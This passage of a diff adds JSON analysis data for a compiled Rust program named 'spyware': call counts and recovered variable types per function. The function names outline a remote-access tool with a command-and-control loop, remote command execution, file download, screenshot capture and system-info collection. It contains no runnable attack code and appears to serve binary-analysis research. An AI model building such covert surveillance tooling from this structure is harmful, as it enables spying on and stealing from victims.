+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$11deserialize17h4c0914be652651d6E": {
+      "<&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum": 1
+    },
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Architecture$GT$9serialize17ha11211a0fbb1410aE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant": 7
+    },
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Architecture$GT$11deserialize17h009a6242e6b769c4E": {
+      "<&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum": 1
+    },
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$9serialize17h41945df7b7138b6dE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant": 2
+    },
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$11deserialize17ha507b2eb88982b6aE": {
+      "<&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum": 1
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$9serialize17h190e21248ceaec03E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 6,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$11deserialize17hd883d2cf07aad750E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_100_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$9serialize17he6158cb9ea855423E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$11deserialize17hb5de4e1218b29ce4E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$9serialize17h0611f531c13c311fE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$11deserialize17hb2af3bb6c4c5294eE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$9serialize17hbb0030a4e5e27df6E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$11deserialize17h10c33b48cca6c544E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$9serialize17h398c010cbc9d0042E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 3,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$11deserialize17hc0278cfffef915f6E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$9serialize17h248e03f41e757f8aE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_108_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$11deserialize17h64523546e7252f88E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages7Message17RunCommandRequest17h075183aa725d84a0E": {},
+    "_ZN7spyware13communication8messages7Message18RunCommandResponse17h87f1971d57af5fa1E": {},
+    "_ZN7spyware13communication8messages7Message19DownloadFileRequest17hb5d1389eec76b978E": {},
+    "_ZN7spyware13communication8messages7Message20DownloadFileResponse17ha7620692d046dc59E": {},
+    "_ZN7spyware13communication8messages7Message19GetBasicInfoRequest17h8d9efe4a6a3d8bcfE": {},
+    "_ZN7spyware13communication8messages7Message20GetBasicInfoResponse17he560e1b25a0d5b84E": {},
+    "_ZN7spyware13communication8messages7Message14GetLogsRequest17he8fe873e6a6e4263E": {},
+    "_ZN7spyware13communication8messages7Message15GetLogsResponse17hd97008268b60995eE": {},
+    "_ZN7spyware13communication8messages7Message20GetScreenshotRequest17h748c79272499737bE": {},
+    "_ZN7spyware13communication8messages7Message21GetScreenshotResponse17h672420867e6f6ff4E": {},
+    "_ZN7spyware13communication8messages1_93_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Message$GT$9serialize17h581434390f64cc04E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant": 10
+    },
+    "_ZN7spyware13communication8messages1_94_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Message$GT$11deserialize17h7721b036fb7eed9cE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_enum": 1
+    },
+    "_ZN7spyware15run_server_loop17ha507d6dda312d1beE": {
+      "log::__private_api::loc": 3,
+      "log::__private_api::log": 3,
+      "spyware::communication::server::run_server": 2,
+      "core::sync::atomic::atomic_load": 3,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "std::thread::sleep": 1
+    },
+    "_ZN7spyware23run_cnc_connection_loop17h099cfaaaff629944E": {
+      "core::option::Option<T>::map_or_else": 1,
+      "std::net::tcp::TcpStream::connect": 1,
+      "log::__private_api::loc": 2,
+      "log::__private_api::log": 2,
+      "core::sync::atomic::atomic_load": 2,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "std::net::tcp::TcpStream::peer_addr": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "<T as alloc::string::SpecToString>::spec_to_string": 1,
+      "core::ptr::drop_in_place<alloc::string::String>": 2,
+      "std::thread::Builder::spawn_unchecked": 1,
+      "core::result::Result<T,E>::expect": 1,
+      "core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>": 1,
+      "std::thread::sleep": 1
+    },
+    "_ZN7spyware12init_logging17h71d90daabdd6a317E": {
+      "core::result::Result<T,E>::unwrap": 1
+    },
+    "_ZN7spyware4main17h0c167b4c5fedcce2E": {
+      "spyware::init_logging": 1,
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "core::result::Result<T,E>::expect": 4,
+      "std::thread::Builder::spawn_unchecked": 1
+    },
+    "_ZN7spyware7actions10basic_info19get_running_os_info17h2ac1d86b9171dd43E": {
+      "<T as alloc::slice::hack::ConvertVec>::to_vec": 1
+    },
+    "_ZN7spyware7actions10basic_info22get_basic_info_request17h37840dd4820167afE": {
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "spyware::actions::basic_info::get_running_os_info": 1
+    },
+    "_ZN7spyware7actions10basic_info21download_file_message17h8a802bf593e1dd2fE": {
+      "log::__private_api::loc": 2,
+      "log::__private_api::log": 2,
+      "core::sync::atomic::atomic_load": 2,
+      "std::fs::File::open": 1,
+      "<T as alloc::string::SpecToString>::spec_to_string": 2,
+      "core::ptr::drop_in_place<alloc::string::String>": 1,
+      "std::io::error::repr_bitpacked::decode_repr": 1,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "<std::fs::File as std::io::Read>::read_to_end": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 1,
+      "core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>": 1
+    },
+    "_ZN7spyware7actions11log_actions16get_logs_request17h84eb7739ff3a4934E": {
+      "log::__private_api::loc": 2,
+      "log::__private_api::log": 2,
+      "core::sync::atomic::atomic_load": 2,
+      "spyware::logging::core::get_logs": 1,
+      "<T as alloc::slice::hack::ConvertVec>::to_vec": 1
+    },
+    "_ZN7spyware7logging4core12MemoryLogger6global17h99d7eb6ce0974984E": {
+      "once_cell::sync::OnceCell<T>::get": 1
+    },
+    "_ZN7spyware7logging4core12MemoryLogger8get_logs17h68454e3110e201f1E": {
+      "std::sys::sync::rwlock::futex::RwLock::read": 1,
+      "std::sync::rwlock::RwLockReadGuard<T>::new": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs": 1,
+      "core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>": 1
+    },
+    "_ZN7spyware7logging4core13setup_logging17hadfb9a3c25f8d0fbE": {
+      "core::sync::atomic::atomic_store": 1,
+      "once_cell::sync::OnceCell<T>::try_insert": 1,
+      "spyware::logging::core::MemoryLogger::global": 1,
+      "core::option::unwrap_failed": 1,
+      "log::set_logger": 1,
+      "core::result::Result<T,E>::unwrap": 1
+    },
+    "_ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E": {
+      "<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::fold": 1
+    },
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs9write_log17h24aec65a22a6ad29E": {
+      "core::ptr::drop_in_place<alloc::string::String>": 2,
+      "std::sync::rwlock::RwLock<T>::write": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "alloc::vec::Vec<T,A>::remove": 1,
+      "spyware::logging::memory_logger::compute_used_chars": 1,
+      "core::ptr::drop_in_place<std::sync::rwlock::RwLockWriteGuard<alloc::vec::Vec<alloc::string::String>>>": 1
+    },
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs12get_all_logs17hfa3a03f9a722fe3cE": {
+      "std::sys::sync::rwlock::futex::RwLock::read": 1,
+      "std::sync::rwlock::RwLockReadGuard<T>::new": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "<alloc::vec::Vec<T,A> as core::clone::Clone>::clone": 1,
+      "core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>": 1
+    },
+    "_ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E": {
+      "<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index": 1,
+      "byteorder::io::ReadBytesExt::read_u32": 1,
+      "core::result::Result<T,E>::unwrap": 1
+    },
+    "_ZN7spyware13communication13serialization17serialize_message17hd905e118d95099f9E": {
+      "ron::ser::to_string": 1,
+      "spyware::communication::serialization::serialize_message::{{closure}}": 1,
+      "alloc::raw_vec::RawVecInner<A>::with_capacity_in": 1,
+      "<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index_mut": 1,
+      "core::slice::<impl [T]>::copy_from_slice": 1,
+      "std::io::impls::<impl std::io::Write for alloc::vec::Vec<u8,A>>::write_all": 1,
+      "<alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter": 1,
+      "<alloc::vec::Vec<T,A> as alloc::vec::spec_extend::SpecExtend<T,alloc::vec::into_iter::IntoIter<T>>>::spec_extend": 1,
+      "core::ptr::drop_in_place<spyware::communication::messages::Message>": 1
+    },
+    "_ZN7spyware7actions18screenshot_actions22get_screenshot_request17h77f87121c90614c4E": {
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "scrap::common::x11::Display::all": 1,
+      "core::result::Result<T,E>::expect": 2,
+      "<alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter": 1,
+      "<alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next": 1,
+      "std::io::stdio::_print": 1,
+      "scrap::common::x11::Capturer::new": 1,
+      "scrap::common::x11::Capturer::frame": 1,
+      "<T as alloc::slice::hack::ConvertVec>::to_vec": 1,
+      "alloc::vec::Vec<T,A>::push": 1,
+      "core::panicking::panic_fmt": 1,
+      "std::io::error::Error::kind": 1,
+      "std::thread::sleep": 1,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<scrap::common::x11::Display>>": 1
+    },
+    "_ZN7spyware7actions8commands11run_command17ha7c0eb7cdcbdbc69E": {
+      "core::option::Option<T>::map_or_else": 1,
+      "cmd_lib::run_fun": 1,
+      "core::ptr::drop_in_place<alloc::string::String>": 1
+    },
+    "_ZN7spyware7actions8commands19run_command_message17h528f548903eb1e39E": {
+      "log::__private_api::loc": 3,
+      "log::__private_api::log": 3,
+      "core::sync::atomic::atomic_load": 3,
+      "spyware::actions::commands::run_command": 1,
+      "<T as alloc::slice::hack::ConvertVec>::to_vec": 1,
+      "std::io::error::repr_bitpacked::decode_repr": 1,
+      "<T as alloc::string::SpecToString>::spec_to_string": 1,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "core::ptr::drop_in_place<spyware::communication::messages::RunCommandRequest>": 1
+    }
+  },
+  "macro_call_counts": {
+    "_ZN7spyware13communication6server13send_response17h17eae7eef2507d79E": 0,
+    "_ZN7spyware13communication6server14handle_message17h02435bd595e8370dE": 0,
+    "_ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE": 0,
+    "_ZN7spyware13communication6server13handle_client17hb99b66a85b0a9c88E": 0,
+    "_ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E": 0,
+    "_ZN7spyware13communication8messages1_95_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$9serialize17h8c3fceac6ed6801fE": 0,
+    "_ZN7spyware13communication8messages1_96_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$11deserialize17h16e2a26e495d2d09E": 0,
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$9serialize17h05e636ca783c8b29E": 0,
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$11deserialize17hf4107a861e3d2baeE": 0,
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$9serialize17hc9c819935a81fe1bE": 0,
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$11deserialize17h67b73dba800a3318E": 0,
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$9serialize17h54b8d5981f6378f4E": 0,
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$11deserialize17h40c06322ea6d693bE": 0,
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$9serialize17hacec97a4be0cc2f5E": 0,
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$11deserialize17h11c5c4e17211802eE": 0,
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$9serialize17h0b9495116de8f9c4E": 0,
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$11deserialize17hcdf93e6675e0bf2cE": 0,
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$9serialize17h8cffced7504157a5E": 0,
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$11deserialize17h4c0914be652651d6E": 0,
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Architecture$GT$9serialize17ha11211a0fbb1410aE": 0,
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Architecture$GT$11deserialize17h009a6242e6b769c4E": 0,
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$9serialize17h41945df7b7138b6dE": 0,
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$11deserialize17ha507b2eb88982b6aE": 0,
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$9serialize17h190e21248ceaec03E": 0,
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$11deserialize17hd883d2cf07aad750E": 0,
+    "_ZN7spyware13communication8messages1_100_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$9serialize17he6158cb9ea855423E": 0,
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$11deserialize17hb5de4e1218b29ce4E": 0,
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$9serialize17h0611f531c13c311fE": 0,
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$11deserialize17hb2af3bb6c4c5294eE": 0,
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$9serialize17hbb0030a4e5e27df6E": 0,
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$11deserialize17h10c33b48cca6c544E": 0,
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$9serialize17h398c010cbc9d0042E": 0,
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$11deserialize17hc0278cfffef915f6E": 0,
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$9serialize17h248e03f41e757f8aE": 0,
+    "_ZN7spyware13communication8messages1_108_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$11deserialize17h64523546e7252f88E": 0,
+    "_ZN7spyware13communication8messages7Message17RunCommandRequest17h075183aa725d84a0E": 0,
+    "_ZN7spyware13communication8messages7Message18RunCommandResponse17h87f1971d57af5fa1E": 0,
+    "_ZN7spyware13communication8messages7Message19DownloadFileRequest17hb5d1389eec76b978E": 0,
+    "_ZN7spyware13communication8messages7Message20DownloadFileResponse17ha7620692d046dc59E": 0,
+    "_ZN7spyware13communication8messages7Message19GetBasicInfoRequest17h8d9efe4a6a3d8bcfE": 0,
+    "_ZN7spyware13communication8messages7Message20GetBasicInfoResponse17he560e1b25a0d5b84E": 0,
+    "_ZN7spyware13communication8messages7Message14GetLogsRequest17he8fe873e6a6e4263E": 0,
+    "_ZN7spyware13communication8messages7Message15GetLogsResponse17hd97008268b60995eE": 0,
+    "_ZN7spyware13communication8messages7Message20GetScreenshotRequest17h748c79272499737bE": 0,
+    "_ZN7spyware13communication8messages7Message21GetScreenshotResponse17h672420867e6f6ff4E": 0,
+    "_ZN7spyware13communication8messages1_93_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Message$GT$9serialize17h581434390f64cc04E": 0,
+    "_ZN7spyware13communication8messages1_94_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Message$GT$11deserialize17h7721b036fb7eed9cE": 0,
+    "_ZN7spyware15run_server_loop17ha507d6dda312d1beE": 0,
+    "_ZN7spyware23run_cnc_connection_loop17h099cfaaaff629944E": 0,
+    "_ZN7spyware12init_logging17h71d90daabdd6a317E": 0,
+    "_ZN7spyware4main17h0c167b4c5fedcce2E": 0,
+    "_ZN7spyware7actions10basic_info19get_running_os_info17h2ac1d86b9171dd43E": 0,
+    "_ZN7spyware7actions10basic_info22get_basic_info_request17h37840dd4820167afE": 0,
+    "_ZN7spyware7actions10basic_info21download_file_message17h8a802bf593e1dd2fE": 0,
+    "_ZN7spyware7actions11log_actions16get_logs_request17h84eb7739ff3a4934E": 0,
+    "_ZN7spyware7logging4core12MemoryLogger6global17h99d7eb6ce0974984E": 0,
+    "_ZN7spyware7logging4core12MemoryLogger8get_logs17h68454e3110e201f1E": 0,
+    "_ZN7spyware7logging4core13setup_logging17hadfb9a3c25f8d0fbE": 0,
+    "_ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E": 0,
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs9write_log17h24aec65a22a6ad29E": 0,
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs12get_all_logs17hfa3a03f9a722fe3cE": 0,
+    "_ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E": 0,
+    "_ZN7spyware13communication13serialization17serialize_message17hd905e118d95099f9E": 0,
+    "_ZN7spyware7actions18screenshot_actions22get_screenshot_request17h77f87121c90614c4E": 0,
+    "_ZN7spyware7actions8commands11run_command17ha7c0eb7cdcbdbc69E": 0,
+    "_ZN7spyware7actions8commands19run_command_message17h528f548903eb1e39E": 0
+  },
+  "variable_types": {
+    "_ZN7spyware13communication6server13send_response17h17eae7eef2507d79E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r14": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_112": [
+        [
+          "array",
+          56
+        ]
+      ]
+    },
+    "_ZN7spyware13communication6server14handle_message17h02435bd595e8370dE": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "reg_r8": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r9": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_bp": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_r15": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_56": [
+        [
+          "array",
+          40
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_160": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_168": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_184": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_200": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_216": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_224": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_248": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_264": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_280": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_288": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_296": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_312": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_328": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_344": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_352": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_360": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_376": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_392": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_408": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_416": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "stack_464": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_472": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "stack_520": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_528": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "stack_576": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_584": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "stack_632": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_640": [
+        [
+          "array",
+          64
+        ]
+      ],
+      "stack_712": [
+        [
+          "array",
+          112
+        ]
+      ]
+    },
+    "_ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
